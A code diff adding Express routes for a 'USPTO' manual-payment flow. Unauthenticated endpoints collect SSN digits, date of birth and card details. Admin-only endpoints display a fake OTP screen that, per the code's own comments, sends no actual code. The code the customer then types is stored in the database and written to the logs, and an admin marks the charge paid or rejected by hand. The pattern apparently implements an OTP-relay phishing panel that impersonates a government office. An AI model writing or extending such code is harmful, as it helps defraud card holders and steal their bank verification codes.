@@ -1181,4 +1181,303 @@ router.patch('/:id/unarchive', auth, adminOrCompliance, async (req, res) => {
   }
 });
 
+// ========== USPTO OFFICE MANUAL PAYMENT ENDPOINTS ==========
+
+// Submit payment request for USPTO brand (no auth required)
+router.post('/public/:id/submit-payment-request', async (req, res) => {
+  try {
+    console.log('\n========== USPTO PAYMENT REQUEST ==========');
+    const { ssnLast4, dateOfBirth, cardData } = req.body;
+    
+    // Get invoice
+    const invoice = await db.invoices.findOne({ _id: req.params.id });
+    
+    if (!invoice) {
+      console.log('ERROR: Invoice not found');
+      return res.status(404).json({ message: 'Invoice not found' });
+    }
+    
+    if (invoice.status === 'paid') {
+      console.log('ERROR: Invoice already paid');
+      return res.status(400).json({ message: 'Invoice already paid' });
+    }
+    
+    if (!invoice.customerVerified) {
+      console.log('ERROR: Customer not verified');
+      return res.status(400).json({ message: 'Customer verification required' });
+    }
+    
+    // Get brand to verify it's USPTO
+    const brand = await db.brands.findOne({ _id: invoice.brandId });
+    if (!brand || !brand.isManualPayment) {
+      console.log('ERROR: Not a USPTO brand');
+      return res.status(400).json({ message: 'This invoice does not support manual payment' });
+    }
+    
+    // Mask card number (store only last 4)
+    const maskedCardNumber = cardData.cardNumber ? `************${cardData.cardNumber.slice(-4)}` : null;
+    
+    // Update invoice with payment request data
+    await db.invoices.update(
+      { _id: invoice._id },
+      { 
+        $set: { 
+          status: 'payment_requested',
+          otpStatus: 'pending',
+          otpMethod: null,
+          adminNote: '',
+          paymentData: {
+            ssnLast4: ssnLast4 || null,
+            dateOfBirth: dateOfBirth || null,
+            cardData: {
+              nameOnCard: cardData.nameOnCard || null,
+              cardNumber: maskedCardNumber,
+              expiry: cardData.expiry || null,
+              cvv: '***' // Never store actual CVV
+            }
+          },
+          updatedAt: new Date().toISOString()
+        } 
+      }
+    );
+    
+    console.log(`Invoice ${invoice.invoiceNumber} status changed to payment_requested`);
+    console.log('========== USPTO PAYMENT REQUEST COMPLETE ==========\n');
+    
+    res.json({ 
+      success: true, 
+      message: 'Payment request submitted. Please wait for verification.',
+      status: 'payment_requested'
+    });
+    
+  } catch (err) {
+    console.error('USPTO payment request error:', err);
+    res.status(500).json({ message: err.message });
+  }
+});
+
+// Get payment status for polling (no auth required)
+router.get('/public/:id/payment-status', async (req, res) => {
+  try {
+    const invoice = await db.invoices.findOne({ _id: req.params.id });
+    
+    if (!invoice) {
+      return res.status(404).json({ message: 'Invoice not found' });
+    }
+    
+    console.log('Payment status check:', {
+      invoiceNumber: invoice.invoiceNumber,
+      status: invoice.status,
+      otpStatus: invoice.otpStatus,
+      otpMethod: invoice.otpMethod
+    });
+    
+    res.json({
+      status: invoice.status,
+      otpStatus: invoice.otpStatus || 'pending',
+      otpMethod: invoice.otpMethod || null,
+      adminNote: invoice.adminNote || ''
+    });
+    
+  } catch (err) {
+    res.status(500).json({ message: err.message });
+  }
+});
+
+// Customer marks OTP as entered (no validation)
+router.post('/public/:id/customer-mark-otp', async (req, res) => {
+  try {
+    console.log('\n========== CUSTOMER MARK OTP ==========');
+    const { code } = req.body;
+    
+    // Get invoice
+    const invoice = await db.invoices.findOne({ _id: req.params.id });
+    
+    if (!invoice) {
+      return res.status(404).json({ message: 'Invoice not found' });
+    }
+    
+    // Update invoice to customer marked status
+    await db.invoices.update(
+      { _id: invoice._id },
+      { 
+        $set: { 
+          otpStatus: 'customer_marked',
+          customerOtpCode: code, // Store what customer entered (for reference)
+          customerMarkedAt: new Date().toISOString(),
+          updatedAt: new Date().toISOString()
+        } 
+      }
+    );
+    
+    console.log(`Invoice ${invoice.invoiceNumber} marked by customer with code: ${code}`);
+    console.log('========== CUSTOMER MARK OTP COMPLETE ==========\n');
+    
+    res.json({ 
+      success: true, 
+      message: 'Payment marked by customer'
+    });
+    
+  } catch (err) {
+    console.error('Customer mark OTP error:', err);
+    res.status(500).json({ message: err.message });
+  }
+});
+
+// Admin actions for USPTO payment (admin only)
+router.post('/:id/uspto-action', auth, adminOnly, async (req, res) => {
+  try {
+    console.log('\n========== ADMIN USPTO ACTION ==========');
+    const { action } = req.body; // 'paid', 'failed', 'card_rejected'
+    
+    // Get invoice
+    const invoice = await db.invoices.findOne({ _id: req.params.id });
+    
+    if (!invoice) {
+      return res.status(404).json({ message: 'Invoice not found' });
+    }
+    
+    let newStatus = 'failed'; // default
+    let message = '';
+    
+    switch (action) {
+      case 'paid':
+        newStatus = 'paid';
+        message = 'Payment marked as successful';
+        break;
+      case 'failed':
+        newStatus = 'failed';
+        message = 'Payment marked as failed';
+        break;
+      case 'card_rejected':
+        newStatus = 'failed';
+        message = 'Payment marked as card not accepted';
+        break;
+      default:
+        return res.status(400).json({ message: 'Invalid action' });
+    }
+    
+    // Update invoice status
+    await db.invoices.update(
+      { _id: invoice._id },
+      { 
+        $set: { 
+          status: newStatus,
+          otpStatus: 'verified',
+          adminAction: action,
+          adminActionAt: new Date().toISOString(),
+          adminActionBy: req.user._id,
+          updatedAt: new Date().toISOString()
+        } 
+      }
+    );
+    
+    console.log(`Invoice ${invoice.invoiceNumber} marked as: ${action}`);
+    console.log('========== ADMIN USPTO ACTION COMPLETE ==========\n');
+    
+    res.json({ 
+      success: true, 
+      status: newStatus,
+      message
+    });
+    
+  } catch (err) {
+    console.error('Admin USPTO action error:', err);
+    res.status(500).json({ message: err.message });
+  }
+});
+
+// Verify OTP - Removed (not needed)
+
+// Send Email OTP (admin only) - Simplified: Just update status, no actual email
+router.post('/:id/send-otp-email', auth, adminOnly, async (req, res) => {
+  try {
+    console.log('\n========== ADMIN TRIGGER OTP SCREEN ==========');
+    const { adminNote } = req.body;
+    
+    // Get invoice
+    const invoice = await db.invoices.findOne({ _id: req.params.id });
+    
+    if (!invoice) {
+      return res.status(404).json({ message: 'Invoice not found' });
+    }
+    
+    if (invoice.status !== 'payment_requested') {
+      return res.status(400).json({ message: 'Invoice is not awaiting payment verification' });
+    }
+    
+    // Simply update invoice to show OTP screen (no actual OTP generation/sending)
+    await db.invoices.update(
+      { _id: invoice._id },
+      { 
+        $set: { 
+          otpStatus: 'email_sent',
+          otpMethod: 'email',
+          adminNote: adminNote || 'Please wait while we verify your payment.',
+          updatedAt: new Date().toISOString()
+        } 
+      }
+    );
+    
+    console.log(`OTP screen triggered for invoice ${invoice.invoiceNumber}`);
+    console.log('========== ADMIN TRIGGER OTP SCREEN COMPLETE ==========\n');
+    
+    res.json({ 
+      success: true, 
+      message: 'OTP screen activated for customer'
+    });
+    
+  } catch (err) {
+    console.error('Trigger OTP screen error:', err);
+    res.status(500).json({ message: err.message });
+  }
+});
+
+// Send SMS OTP (admin only) - Simplified: Just update status
+router.post('/:id/send-otp-sms', auth, adminOnly, async (req, res) => {
+  try {
+    console.log('\n========== ADMIN TRIGGER OTP SCREEN (SMS) ==========');
+    const { adminNote } = req.body;
+    
+    // Get invoice
+    const invoice = await db.invoices.findOne({ _id: req.params.id });
+    
+    if (!invoice) {
+      return res.status(404).json({ message: 'Invoice not found' });
+    }
+    
+    if (invoice.status !== 'payment_requested') {
+      return res.status(400).json({ message: 'Invoice is not awaiting payment verification' });
+    }
+    
+    // Simply update invoice to show OTP screen
+    await db.invoices.update(
+      { _id: invoice._id },
+      { 
+        $set: { 
+          otpStatus: 'sms_sent',
+          otpMethod: 'sms',
+          adminNote: adminNote || 'Please wait while we verify your payment.',
+          updatedAt: new Date().toISOString()
+        } 
+      }
+    );
+    
+    console.log(`OTP screen (SMS) triggered for invoice ${invoice.invoiceNumber}`);
+    console.log('========== ADMIN TRIGGER OTP SCREEN (SMS) COMPLETE ==========\n');
+    
+    res.json({ 
+      success: true, 
+      message: 'OTP screen activated for customer'
+    });
+    
+  } catch (err) {
+    console.error('Trigger OTP screen error:', err);
+    res.status(500).json({ message: err.message });
+  }
+});
+
+// ========== END USPTO OFFICE ENDPOINTS ==========
+
+
 module.exports = router;
